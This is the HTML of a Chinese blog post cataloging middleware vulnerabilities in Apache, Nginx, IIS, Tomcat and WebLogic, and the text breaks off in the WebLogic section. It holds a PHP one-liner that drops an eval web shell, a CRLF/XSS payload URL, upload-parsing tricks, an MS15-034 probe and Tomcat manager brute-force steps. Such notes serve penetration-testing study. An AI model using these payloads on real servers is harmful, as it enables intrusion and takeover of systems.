class="post-toc-text">4、JBoss EJBInvokerServlet 反序列化漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5、CVE-2017-7504"><span class="post-toc-number">6.5.</span> <span class="post-toc-text">5、CVE-2017-7504</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-dlvqrg"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">中间件漏洞</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-07-28 14:03:55" datetime="2020-07-28T06:03:55.000Z"  itemprop="datePublished">2020-07-28</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="一、apache"><a href="#一、apache" class="headerlink" title="一、apache"></a>一、apache</h1><h2 id="1、解析漏洞"><a href="#1、解析漏洞" class="headerlink" title="1、解析漏洞"></a>1、解析漏洞</h2><p>影响范围：<br>1.apahce 与 php 是以 module 方式交互（phpinfo）</p>
+<ol start="2">
+<li>apahce 全版本<br>Apache 默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在 mime.types 文件<br>内），则继续向左识别，直到识别到合法后缀才进行解析。</li>
+</ol>
+<h2 id="2、AddHandler-导致的解析漏洞"><a href="#2、AddHandler-导致的解析漏洞" class="headerlink" title="2、AddHandler 导致的解析漏洞"></a>2、AddHandler 导致的解析漏洞</h2><p>httpd.conf 中存在<br><code>AddHandler application/x-httpd-php .php</code><br>只要文件中存在.php 就可以 php 执行</p>
+<h2 id="3、-htacess-漏洞"><a href="#3、-htacess-漏洞" class="headerlink" title="3、.htacess 漏洞"></a>3、.htacess 漏洞</h2><p>httpd.conf 中存在<br><code>AllowOverride All</code><br><code>LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so</code><br>.htaccess 文件<br><code>AddType application/x-httpd-php xxx</code><br>或者<br><code>&lt;FilesMatch &quot;shell.jpg&quot;&gt;</code><br><code>SetHandler application/x-httpd-php</code><br><code>&lt;/FilesMatch&gt;</code></p>
+<h2 id="4、Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#4、Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="4、Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>4、Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>影响范围：2.4.0~2.4.29 版本<br>1、上传一个 xx.php%0a 的文件，windows 下访问 xx.php 即可，linux 下访问 xx.php%oa</p>
+<h1 id="二、nginx"><a href="#二、nginx" class="headerlink" title="二、nginx"></a>二、nginx</h1><h2 id="1、解析漏洞-1"><a href="#1、解析漏洞-1" class="headerlink" title="1、解析漏洞"></a>1、解析漏洞</h2><p>影响范围：默认存在<br>                  在 Fast-CGI 关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞<br><strong>该漏洞是 Nginx 配置所导致，与 Nginx 版本无关)，只要存在 php.ini 中的 cgi.fix_pathinfo = 1，就存在（可以通过 phpinfo 判断</strong><br><strong><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589620511383-cf4a4ec2-dc4e-4cb5-9e1d-9f5f1a4376c2.png#align=left&display=inline&height=257&margin=%5Bobject%20Object%5D&name=image.png&originHeight=343&originWidth=752&size=24274&status=done&style=none&width=564" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure></strong><br>1、直接在正常图片 URL 后添加 /.php 即可以 php 执行<br>在一个文件路径(/xx.jpg)后面加上%00.php 会将 /xx.jpg%00.php 解析为 php 文件。<br>这是从 /test.jpg/x.php 演变过来的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;1.php</span><br><span class="line">www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;%20\0.php</span><br></pre></td></tr></table></figure>
+
+<p>另外一种手法：上传一个名字为 test.jpg，以下内容的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后访问 test.jpg/.php,在这个目录下就会生成一句话木马 shell.php。</p>
+<h2 id="2、Nginx-空字节任意代码执行漏洞"><a href="#2、Nginx-空字节任意代码执行漏洞" class="headerlink" title="2、Nginx 空字节任意代码执行漏洞"></a>2、Nginx 空字节任意代码执行漏洞</h2><p>影响版本：Nginx 0.5<em>, 0.6</em>,0.7._&lt;= 0.7.65 0.8._ &lt;= 0.8.37<br>上传 1.jpg,内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589620921918-03b2cfd9-bd19-4ed7-87e6-9b747d2f71a7.png#align=left&display=inline&height=166&margin=%5Bobject%20Object%5D&name=image.png&originHeight=332&originWidth=1441&size=231455&status=done&style=none&width=720.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>访问 1.jpg 抓包<br>并将 1.jpg 改成 1.jpg..php 然后在 hex 里将第一个.修改为空字节 00 即可执行 php，该漏洞不受 cgi.fix_pathinfo 影响，当 cgi.fix_pathinfo 为 0 时，依旧解析。</p>
+<h2 id="3、Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#3、Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="3、Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>3、Nginx 文件名逻辑漏洞（CVE-2013-4547）</h2><p>影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7<br>1、访问<a href="http://your-ip:8080/" target="_blank" rel="noopener">http://your-ip:8080/</a> 上传文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621058937-5eae691d-b65e-49b5-b8b9-fba368448423.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=560&originWidth=1578&size=256609&status=done&style=none&width=789" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>2、访问<a href="http://your-ip:8080/uploadfiles/info.jpg" target="_blank" rel="noopener">http://your-ip:8080/uploadfiles/info.jpg</a> 并抓包更为<a href="http://your-ip:8080/uploadfiles/info.jpg" target="_blank" rel="noopener">http://your-ip:8080/uploadfiles/info.jpg</a>…php（三个.）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621100009-a32c1987-edd9-43c6-b27f-defdc80cf9eb.png#align=left&display=inline&height=368&margin=%5Bobject%20Object%5D&name=image.png&originHeight=368&originWidth=1041&size=93742&status=done&style=none&width=1041" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>将前两个.修改为 20 和 00</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621116654-3b440c46-6aba-4481-83eb-8ca6c0d81718.png#align=left&display=inline&height=142&margin=%5Bobject%20Object%5D&name=image.png&originHeight=283&originWidth=1677&size=99158&status=done&style=none&width=838.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>该漏洞不受 cgi.fix_pathinfo 影响，当其为 0 时，依旧解析，在 Windows 上有所限制（针对 linux）。</p>
+<h2 id="4、CRLF-注入"><a href="#4、CRLF-注入" class="headerlink" title="4、CRLF 注入"></a>4、CRLF 注入</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621175144-7105104a-2e07-4fa9-bdd1-6c4cd0cac79a.png#align=left&display=inline&height=170&margin=%5Bobject%20Object%5D&name=image.png&originHeight=339&originWidth=1160&size=126408&status=done&style=none&width=580" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>就可<a href="http://127.0.0.1/%0aX-XSS-Protection:%200%0a%0d%0a%0d%3Cimg%20src=1%20onerror=alert(/xss/)%3E" target="_blank" rel="noopener">http://127.0.0.1/%0aX-XSS-Protection:%200%0a%0d%0a%0d%3Cimg%20src=1%20onerror=alert(/xss/)%3E</a></p>
+<h2 id="5、目录穿越-目录遍历"><a href="#5、目录穿越-目录遍历" class="headerlink" title="5、目录穿越(目录遍历)"></a>5、目录穿越(目录遍历)</h2><p>Nginx 在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。错误的配置文件示例（原本的目的是为了让用户访问到 D:/phpStudy/WWW/phpMyAdmin 的文件）：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /phpMyAdmin &#123;</span><br><span class="line">            <span class="attribute">alias</span>   <span class="string">"D:/phpStudy/WWW/phpMyAdmin/"</span>;</span><br><span class="line">           <span class="attribute">autoindex</span>  <span class="literal">on</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621291081-57e6688c-5fee-4e74-85e9-52750cb1b67d.png#align=left&display=inline&height=277&margin=%5Bobject%20Object%5D&name=image.png&originHeight=554&originWidth=1188&size=147068&status=done&style=none&width=594" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>只需要保证 location 和 alias 的值都有后缀/或都没有/这个后缀。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /phpMyAdmin/ &#123;</span><br><span class="line">            <span class="attribute">alias</span>   <span class="string">"D:/phpStudy/WWW/phpMyAdmin/"</span>;</span><br><span class="line">           <span class="attribute">autoindex</span>  <span class="literal">on</span>;</span><br></pre></td></tr></table></figure>
+
+<p>去掉/</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /phpMyAdmin &#123;</span><br><span class="line">            <span class="attribute">alias</span>   <span class="string">"D:/phpStudy/WWW/phpMyAdmin"</span>;</span><br><span class="line">           <span class="attribute">autoindex</span>  <span class="literal">on</span>;</span><br></pre></td></tr></table></figure>
+
+<p>即可解决</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621457313-7c042022-ab70-4917-8074-2878ea1de6d9.png#align=left&display=inline&height=121&margin=%5Bobject%20Object%5D&name=image.png&originHeight=242&originWidth=1047&size=28907&status=done&style=none&width=523.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>当 Nginx 配置文件中，autoindex 的值为 on 时，将造成一个目录遍历漏洞。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621501026-e569a94d-e308-477a-84b1-326b6939f456.png#align=left&display=inline&height=213&margin=%5Bobject%20Object%5D&name=image.png&originHeight=426&originWidth=1125&size=119411&status=done&style=none&width=562.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>当配置为 on 时存在目录遍历<br>add_header 被覆盖</p>
+<h1 id="三、iis"><a href="#三、iis" class="headerlink" title="三、iis"></a>三、iis</h1><h2 id="1、解析漏洞-2"><a href="#1、解析漏洞-2" class="headerlink" title="1、解析漏洞"></a>1、解析漏洞</h2><h3 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h3><h4 id="基于文件名"><a href="#基于文件名" class="headerlink" title="基于文件名"></a>基于文件名</h4><p>该版本 默认会将 *.asp;.jpg 此种格式的文件名，当成 Asp 解析，原理是服务器默认不解析; 号及其后的内容，相当于截断。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.asa，.cdx，.cer解析为asp</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于目录名"><a href="#基于目录名" class="headerlink" title="基于目录名"></a>基于目录名</h4><p>（<a href="https://github.com/c0ny1/upload-fuzz-dic-builder" target="_blank" rel="noopener">https://github.com/c0ny1/upload-fuzz-dic-builder</a>）该版本 默认会将 *.asp/目录下的所有文件当成 Asp 解析</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621664428-9837c5e2-4c0c-4322-8c93-c670c1a1237a.png#align=left&display=inline&height=247&margin=%5Bobject%20Object%5D&name=image.png&originHeight=493&originWidth=1694&size=120414&status=done&style=none&width=847" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h4 id="PUT-任意文件写入"><a href="#PUT-任意文件写入" class="headerlink" title="PUT 任意文件写入"></a>PUT 任意文件写入</h4><p>影响范围：IIS 6.0 在 Web 服务扩展中开启了 WebDAV 之后，支持多种请求，配合写入权限，可造成任意文件写入。<br>1、webDAV 未开启前</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621984424-dd38848f-de49-4453-b85c-09640554bb8c.png#align=left&display=inline&height=132&margin=%5Bobject%20Object%5D&name=image.png&originHeight=263&originWidth=1464&size=61425&status=done&style=none&width=732" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>2、webDAV 开启后</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621998760-5e37a549-f0ba-4dfd-8e24-217a22334ffa.png#align=left&display=inline&height=130&margin=%5Bobject%20Object%5D&name=image.png&originHeight=260&originWidth=1903&size=71908&status=done&style=none&width=951.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>3、工具</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622012054-6d13c188-a1fc-4206-b5cb-33cb8a21e456.png#align=left&display=inline&height=165&margin=%5Bobject%20Object%5D&name=image.png&originHeight=329&originWidth=714&size=36270&status=done&style=none&width=357" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622025634-5206ef73-2aa0-4ad6-b24a-96db91ebc1ee.png#align=left&display=inline&height=140&margin=%5Bobject%20Object%5D&name=image.png&originHeight=280&originWidth=987&size=67322&status=done&style=none&width=493.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h4 id="CVE-2015-1635-amp-ms15-034"><a href="#CVE-2015-1635-amp-ms15-034" class="headerlink" title="CVE-2015-1635&amp;ms15-034"></a>CVE-2015-1635&amp;ms15-034</h4><p>1、输入命令<code>curl http``:``/``/``10.66``.60``.22``/`` ``-``H`` ``&quot;Host: irrelevant&quot;`` ``-``H`` ``&quot;Range: bytes=0-18446744073709551615&quot;``|``findstr ``&quot;range is not satisfiable&quot;</code><br>截图：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589612397091-4b709905-81f8-4289-badf-becb6270562f.png#align=left&display=inline&height=94&margin=%5Bobject%20Object%5D&name=111.png&originHeight=94&originWidth=959&size=9045&status=done&style=none&width=959" alt="111.png" title="">
+                </div>
+                <div class="image-caption">111.png</div>
+            </figure>
+<p>发现返回”range is not satisfiable”就说明有漏洞。</p>
+<h4 id="CVE-2017-7269"><a href="#CVE-2017-7269" class="headerlink" title="CVE-2017-7269"></a>CVE-2017-7269</h4><p>影响范围： 在 Windows 2003 R2（Microsoft(R) Windows(R) Server2003, Enterprise Edition Service Pack 2）上使用 IIS 6.0 并开启 WebDAV 扩展<br>exp:<code>https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py</code></p>
+<h3 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h3><p>影响范围：Fast-CGI 运行模式（phpinfo）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621906766-2c41242a-6b97-4f61-8e43-6103148a65e3.png#align=left&display=inline&height=82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=164&originWidth=790&size=12418&status=done&style=none&width=395" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>1、安装 iis 7.5<br>2、下载<a href="https://windows.php.net/downloads/releases/archives/" target="_blank" rel="noopener">php-5.2.6-win32-installer.msi</a> 3.打开 msi，一直下一步来到选择 web server setup 的界面，在这里选择 IIS fastcgi,之后一直下一步 4.打开 IIS，管理工具 -&gt;Internet 信息服务(IIS)管理器</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621751505-5047f39a-4348-4a07-bc3d-e8588071db2f.png#align=left&display=inline&height=282&margin=%5Bobject%20Object%5D&name=image.png&originHeight=564&originWidth=1170&size=209535&status=done&style=none&width=585" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>5、添加安装的 php-cgi.exe 路径，描述随意。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621767485-10756e26-9afe-4a7c-8245-502bdb4600b7.png#align=left&display=inline&height=207&margin=%5Bobject%20Object%5D&name=image.png&originHeight=413&originWidth=1167&size=109695&status=done&style=none&width=583.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>6、添加映射。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621787086-cd6c5fc2-b93c-41bc-85cc-9a5b47fb42a4.png#align=left&display=inline&height=288&margin=%5Bobject%20Object%5D&name=image.png&originHeight=575&originWidth=1168&size=184598&status=done&style=none&width=584" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>7.phpinfo 测试</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621802368-9177577a-e501-463b-99fe-52bc63a48fb6.png#align=left&display=inline&height=277&margin=%5Bobject%20Object%5D&name=image.png&originHeight=553&originWidth=1196&size=78679&status=done&style=none&width=598" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>IIS7.x 版本 在 Fast-CGI 运行模式下,上传任意文件，例：phpinfo.jpg，只需要在访问 url 后面加上/.php，会将 test.jpg 解析为 php 文件。<br><code>http://192.168.3.42/phpinfo.jpg/.php</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621856680-bdde5cd6-fca4-4b42-982c-bbd0f146dba8.png#align=left&display=inline&height=246&margin=%5Bobject%20Object%5D&name=image.png&originHeight=491&originWidth=777&size=135015&status=done&style=none&width=388.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="四、tomcat"><a href="#四、tomcat" class="headerlink" title="四、tomcat"></a>四、tomcat</h1><h2 id="1、CVE-2017-12615"><a href="#1、CVE-2017-12615" class="headerlink" title="1、CVE-2017-12615"></a>1、CVE-2017-12615</h2><p>环境：Tomcat/8.0.30（暂未发现有版本限制，也有说法是存在于 7.0.0-7.0.79）漏洞本质是 Tomcat 配置文件/conf/web.xml 配置了可写（readonly=false），导致我们可以往服务器写文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;readonly&lt;&#x2F;param-name&gt;</span><br><span class="line">            &lt;param-value&gt;false&lt;&#x2F;param-value&gt;</span><br><span class="line">&lt;&#x2F;init-param&gt;</span><br></pre></td></tr></table></figure>
+
+<p>新建一个 1.jsp 文件的格式为（上传 webshell 文件，需要在文件名后加空格%20 或者/）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622473997-a8c26ff9-c9ac-441a-95e5-584c01fbdb9b.png#align=left&display=inline&height=141&margin=%5Bobject%20Object%5D&name=image.png&originHeight=282&originWidth=1502&size=45747&status=done&style=none&width=751" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>改成</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622487074-68c33fd8-6924-4ff3-a84b-f5adf7450205.png#align=left&display=inline&height=181&margin=%5Bobject%20Object%5D&name=image.png&originHeight=362&originWidth=1505&size=73981&status=done&style=none&width=752.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="2、CVE-2019-0232"><a href="#2、CVE-2019-0232" class="headerlink" title="2、CVE-2019-0232"></a>2、CVE-2019-0232</h2><p>影响范围：9.0.0.M1 ~ 9.0.17, 8.5.0 ~ 8.5.39 ， 7.0.0 ~ 7.0.93 影响<br>系统： Windows 默认配置不存在此漏洞（仅对 windows 有效）</p>
+<h2 id="3、Tomcat-弱口令-amp-amp-后台-getshell-漏洞"><a href="#3、Tomcat-弱口令-amp-amp-后台-getshell-漏洞" class="headerlink" title="3、Tomcat + 弱口令 &amp;&amp; 后台 getshell 漏洞"></a>3、Tomcat + 弱口令 &amp;&amp; 后台 getshell 漏洞</h2><p>webapps 下的 host-manager 和 manager，都有一个共同的文件夹 META-INF，里面都有 context.xml，通过这个文件配置本地连接还是远程连接（默认本地连接）<br>1、访问<br><a href="http://ip:port/manager/status"><code>http://ip:port/manager/status</code></a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622596700-748230e7-e599-4cd4-94c7-97bdcbe0c470.png#align=left&display=inline&height=252&margin=%5Bobject%20Object%5D&name=image.png&originHeight=504&originWidth=1264&size=90306&status=done&style=none&width=632" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>tomcat7.0.94 中默认没有任何用户，且 manager 页面只允许本地 IP 访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p>
+<h2 id="4、Tomcat-manager-App-暴力破解"><a href="#4、Tomcat-manager-App-暴力破解" class="headerlink" title="4、Tomcat manager App 暴力破解"></a>4、Tomcat manager App 暴力破解</h2><p>1、访问<a href="http://ip:port/manager/html">http://ip:port/manager/html</a>, 输入用户名 123，密码 123，抓包，如下。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622658542-7dde5178-5fa6-426e-9481-fb1992603e90.png#align=left&display=inline&height=181&margin=%5Bobject%20Object%5D&name=image.png&originHeight=362&originWidth=848&size=39823&status=done&style=none&width=424" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622670265-dc4f4947-1eac-4a83-aa9c-b768e1a64258.png#align=left&display=inline&height=146&margin=%5Bobject%20Object%5D&name=image.png&originHeight=292&originWidth=867&size=39620&status=done&style=none&width=433.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>刚才输入的账号密码在 HTTP 字段中的 Authorization 中，规则为 Base64Encode(user:passwd) Authorization: Basic dG9tY2F0OmFkbWlu 解码之后如下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622726544-874e57cf-95a9-41f8-b4fe-52f874976ff7.png#align=left&display=inline&height=200&margin=%5Bobject%20Object%5D&name=image.png&originHeight=261&originWidth=401&size=4931&status=done&style=none&width=307" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>2、发送到 intruder</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622781869-caa9ef35-66e9-436b-a4d6-7363ad95e51c.png#align=left&display=inline&height=173&margin=%5Bobject%20Object%5D&name=image.png&originHeight=346&originWidth=702&size=43578&status=done&style=none&width=351" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622793645-7b366c64-b336-41bf-9749-e1c89763cd14.png#align=left&display=inline&height=314&margin=%5Bobject%20Object%5D&name=image.png&originHeight=628&originWidth=601&size=45027&status=done&style=none&width=300.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>position1 设置为用户名字典<br>position2 设置为:<br>position3 设置为密码<br>取消勾选</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622819927-686f5c2a-ce16-4302-8875-6c54e288974d.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=1008&size=38309&status=done&style=none&width=504" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>3、爆破成功</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622840495-0c2f5e13-683d-4d37-9cc4-09c9137f0316.png#align=left&display=inline&height=131&margin=%5Bobject%20Object%5D&name=image.png&originHeight=261&originWidth=1098&size=26637&status=done&style=none&width=549" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>注意：在 tomcat7.0 后，默认会有登录次数限制，需要手动更改 conf/server.xml 才能进行爆破</p>
+<h2 id="5、CVE-2020-1938"><a href="#5、CVE-2020-1938" class="headerlink" title="5、CVE-2020-1938"></a>5、CVE-2020-1938</h2><p>工具：<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622901347-44726076-94ec-48ed-809f-a37097f73dbc.png#align=left&display=inline&height=485&margin=%5Bobject%20Object%5D&name=image.png&originHeight=530&originWidth=1203&size=89958&status=done&style=none&width=1100" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="6、CVE-2016-8735（暂未复现）"><a href="#6、CVE-2016-8735（暂未复现）" class="headerlink" title="6、CVE-2016-8735（暂未复现）"></a>6、<a href="http://gv7.me/articles/2018/CVE-2016-8735/" target="_blank" rel="noopener">CVE-2016-8735</a>（暂未复现）</h2><h1 id="五、weblogic"><a href="#五、weblogic" class="headerlink" title="五、weblogic"></a>五、weblogic</h1><h2 id="1、CVE-2017-10271"><a href="#1、CVE-2017-10271" class="headerlink" title="1、CVE-2017-10271"></a>1、CVE-2017-10271</h2><p>访问 /wls-wsat/CoordinatorPortType 返回如下页面，则可能存在此漏洞。(<strong>也有可能为 CVE-2019-02725</strong>)</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
